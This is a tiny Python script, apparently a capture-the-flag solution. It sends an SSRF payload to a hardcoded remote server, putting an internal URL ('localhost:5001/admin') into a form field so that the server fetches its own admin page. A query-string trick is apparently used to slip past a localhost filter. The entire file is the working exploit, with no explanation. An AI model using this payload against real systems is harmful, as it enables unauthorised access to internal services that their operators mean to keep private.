from requests import *

r = post('http://139.162.5.230:10417/home', data={'text': 'http://localhost:5001/admin?localhost:8311'})
print(r.text)